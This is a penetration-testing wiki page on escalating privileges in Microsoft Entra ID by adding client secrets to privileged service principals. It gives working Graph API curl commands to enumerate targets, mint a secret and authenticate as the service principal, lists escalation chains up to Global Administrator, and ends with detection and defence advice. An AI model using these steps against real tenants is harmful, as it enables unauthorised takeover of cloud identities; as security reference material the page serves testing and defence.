---
title: Service principal abuse
slug: service-principal-abuse
---

> **TL;DR:** App ownership, `Application.ReadWrite.All`, or membership in Application Administrator / Cloud Application Administrator lets you add a new client secret or certificate to any service principal; authenticate as the SP and inherit every Graph permission or Azure RBAC role it holds.

## What it is
Every Entra application has a separate object (the app registration) and one or more service principal instances (one per tenant). Whoever can write the app's `passwordCredentials` (a client secret) or `keyCredentials` (a certificate) can authenticate as the SP via client-credentials flow. Built-in roles `Application Administrator` and `Cloud Application Administrator` grant exactly this on every application except those with the `Privileged Role Administrator` lock — historically a famous privesc gap because admins assigned these "low-risk" roles without realising they could mint SP creds for highly-privileged apps.

## Preconditions / where it applies
- Foothold principal is the app's owner, OR holds Application Administrator / Cloud Application Administrator / Hybrid Identity Administrator, OR has `Application.ReadWrite.All` Graph permission.
- Target SP has Graph app permissions or Azure RBAC roles worth inheriting (`Directory.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`, Owner on subscription).
- Network egress to `login.microsoftonline.com` and `graph.microsoft.com`.

## Technique
**Find juicy SPs:**

```bash
# via roadrecon — list SPs with admin-consented app permissions
roadrecon plugins privexchange   # known dangerous-role finder
# or directly:
curl -H "Authorization: Bearer $T" \
  'https://graph.microsoft.com/v1.0/servicePrincipals?$select=appId,displayName,appRoleAssignments'
```

Look for SPs with: `RoleManagement.ReadWrite.Directory`, `Application.ReadWrite.All`, `Directory.ReadWrite.All`, or owner/contributor RBAC on a subscription.

**Add a client secret to the target app:**

```bash
APPID=<application-object-id>
curl -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
  "https://graph.microsoft.com/v1.0/applications/$APPID/addPassword" \
  -d '{"passwordCredential":{"displayName":"maint"}}'
# response includes secretText — save it
```

**Authenticate as the SP:**

```bash
curl -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "client_id=$APP_CLIENT_ID&client_secret=$SECRET&scope=https://graph.microsoft.com/.default&grant_type=client_credentials"
```

**Privesc chains:**
- SP with `RoleManagement.ReadWrite.Directory` → assign yourself Global Administrator.
- SP that's Owner on a subscription → create a VM with a system-assigned managed identity, RDP/SSH in, steal MI token, repeat in Azure plane.
- SP with `Application.ReadWrite.All` (no privileged app) → add credentials to other SPs that *do* have privileged Graph perms (chain).

**Ownership pivot:** if your user is `owner` on an app, you don't need Application Administrator — owners can add credentials by default.

Related: [[app-registration-abuse]] (which is the same primitive viewed from the registration side), [[managed-identities]] (a related credential type), [[az-cli-tokens]] for stealing user creds that then grant these powers.

## Detection and defence
- Audit log events: `Add service principal credentials`, `Update application – Certificates and secrets management` — alert on every occurrence; baseline is near-zero outside scripted issuance.
- Restrict Application Administrator / Cloud Application Administrator to break-glass accounts; use Application Developer for low-priv app creation.
- Enable Application Restrictions in Conditional Access to limit which apps can be consented at scale.
- Use workload identity Conditional Access for SP sign-ins; require named-location IP and short token lifetime.
- Inventory SP permissions monthly; remove unused admin-consented grants.
- Move secrets to Federated Identity Credentials (no secret to steal) where possible.

## References
- [Andy Robbins — Azure privilege escalation via service principal abuse](https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5) — canonical write-up
- [Microsoft — Application and service principal](https://learn.microsoft.com/en-us/entra/identity-platform/app-objects-and-service-principals) — object model
- [HackTricks Cloud — Azure SP abuse](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/az-services-privesc/az-applications.html) — abuse paths
